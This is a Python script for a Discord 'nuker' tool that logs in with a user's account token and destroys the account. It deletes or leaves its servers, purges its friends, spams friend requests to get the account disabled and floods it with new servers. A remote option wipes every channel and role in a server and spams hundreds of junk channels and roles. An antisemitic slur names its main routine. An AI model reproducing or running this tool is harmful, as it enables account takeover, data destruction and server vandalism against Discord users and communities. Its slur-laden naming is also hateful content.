import discord
from colorama import Fore as col
from colorama import Style as st
import random, os, datetime, asyncio
import requests as req
from aiohttp import client
s = st.BRIGHT
c = col.GREEN
print(f"""{c}
{st.BRIGHT}{col.GREEN}########    ########     ###    ##    ## 
{st.BRIGHT}{col.GREEN}   ##       ##     ##   ## ##   ###   ## 
{st.BRIGHT}{col.GREEN}   ##       ##     ##  ##   ##  ####  ## 
{st.BRIGHT}{col.GREEN}   ##       ########  ##     ## ## ## ## 
{st.BRIGHT}{col.GREEN}   ##       ##     ## ######### ##  #### 
{st.BRIGHT}{col.GREEN}   ##       ##     ## ##     ## ##   ### 
{st.BRIGHT}{col.GREEN}   ##       ########  ##     ## ##    ## 
{st.DIM}{col.RED}A tool for reseting or destroying user accounts.

{col.GREEN}{s}Options:
-------------------------------------
>>kike<< - Destroys an account like a normal furnace would
>>disable<< - Disables the account
>>reset<< - Deletes all the users guilds
>>remotenuke<< - remotely nukes a guild if user has admin on it 
-------------------------------------
>>userinfo<< - Fetches the users friends
>>friendpurge<< - deletes all friends
-------------------------------------
""")

##################SETTINGS###################
token = "" #token, if left empty will become an input
AutomatedKike = False #auto kikes account
guildname = "" #guildname for kike
##################SETTINGS################### 
if AutomatedKike == True:
    print(st.BRIGHT+col.RED+f"AutomatedKike is enabled.") 
if not token:
    token = input("Token: ")
class MyClient(discord.Client):
    async def on_connect(self):
        print(f"""Logged into user: {client.user}
ID: {client.user.id}
Email: {client.user.email}
Created At: {client.user.created_at}
MFA: {client.user.mfa_enabled}
Nitro: {client.user.premium_type}
Flags: {client.user.public_flags}
Verified: {client.user.verified}""")
        if AutomatedKike == True:
          await userinfo(self)
          await kike(self)
          await disable(self)
        choice = input(f"Your Choice:{col.RED} ")
        if choice == "kike":
            print(col.RED+f"Destroying {client.user}'s account.")
            await kike(self)
        elif choice == "reset":
            print(f"Resetting {client.user}\'s account.'")
            await reset(self)
        elif choice == "disable":
            await disable(self)
        elif choice == "friendpurge":
            await frienddel(self)
        elif choice == "remotenuke":
            await remotenuke(self)
        elif choice == "userinfo":
            await userinfo(self)
        elif not choice:
            os.system("clear")
            print(col.GREEN+f"No Option Given, Logging Out.")
            await client.logout()
ids = [768496306556502068, 764577901806485545, 763384611925000193, 750317688944853064, 599636206719860754, 754619738541260821]
async def disable(self):
    print(f"Disabling {client.user}")
    while True:
        disableid = await client.fetch_user(random.choice(ids))
        username = disableid.name
        disablediscrim = disableid.discriminator
        print(f"Sent a friend request to {username}")
        req.post("https://discord.com/api/v6/users/@me/relationships", headers = {'authorization' : token}, json = {'username' : username, 'discriminator' : int(disablediscrim)})
async def reset(self):
    await client.user.edit_settings(theme=discord.Theme.dark, developer_mode=True, animate_emojis=True, gif_auto_play=True, render_reactions=True, default_guilds_restricted=False, message_display_compact=False)
    for guild in client.guilds:
        try:
            print(f"{guild} was deleted")
            await guild.delete()
        except:
            pass
        try:
            await guild.leave()
            print(f"Left {guild}")
        except:
            pass

async def remotenuke(self):
    await userinfo(self)
    guildid = input("guildid to nuke: ")
    guild = await client.fetch_guild(guild_id=guildid)
    print(f"Nuking {guild}.")
    for channel in guild.channels:
        try:
           await channel.delete()
           print(col.GREEN+f"CHANNEL: {channel} deleted")
        except:
           print(col.RED+f"CHANNEL: Couldn't delete {channel}")
    for role in guild.roles:
        try:
            await role.delete()
            print(col.GREEN+f"ROLE: {role} deleted")
        except:
            print(col.RED+f"ROLE: Couldn't delete {role}")
    await guild.edit(default_notifications=discord.NotificationLevel.all_messages,verification_level=discord.VerificationLevel.extreme ,name=f"{guild.id}﷽﷽﷽{guild.id}", icon=None)
    for x in range(500):
        await guild.create_text_channel(name="﷽﷽﷽﷽﷽﷽﷽﷽﷽")
        await guild.create_voice_channel(name="﷽﷽﷽﷽﷽﷽﷽﷽﷽")
        await guild.create_category(name="﷽﷽﷽﷽﷽﷽﷽﷽﷽")
    for x in range(250):
        await guild.create_role("﷽﷽﷽﷽﷽﷽﷽﷽")
    return



async def frienddel(self):
    for friend in client.user.friends:
        try:
         print(f"{friend} was unfriended")
         await friend.remove_friend()
        except:
         print(f"{friend} wasn't deleted")

async def userinfo(self):
    for friend in client.user.friends:
        print(col.GREEN+f"{client.user} is friends with {friend}, ID is {friend.id}")
    for guild in client.guilds:
     print(col.GREEN+f"{client.user} is in {guild.name}, Guild ID is {guild.id}")
   

langs = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

async def kike(self):
        req.delete('https://discord.com/api/v8/hypesquad/online', headers={'authorization': token})
        await client.user.edit_settings(theme=discord.Theme.light, locale="ko", developer_mode=False, animate_emojis=False, gif_auto_play=False, render_reactions=False, default_guilds_restricted=True, message_display_compact=True)
        for friend in client.user.friends:
            await friend.remove_friend()
            print(col.GREEN+f"{friend} was unfriended")
        for user in client.user.blocked:
            await user.unblock() 
            print(col.GREEN+f"{user} was unblocked")     
        for guild in client.guilds:
            try:
                await guild.delete()
                print(col.GREEN + f'Deleted {guild}')
            except:
                pass
            try:
                await guild.leave()
                print(col.GREEN + f'Left {guild}')
            except:
                pass
        for x in range(100):
            await client.create_guild(name=guildname)
            print(F"Made {guildname}")




client = MyClient()
try:
 client.run(token, bot=False)
except discord.LoginFailure:
 print("INVALID TOKEN")
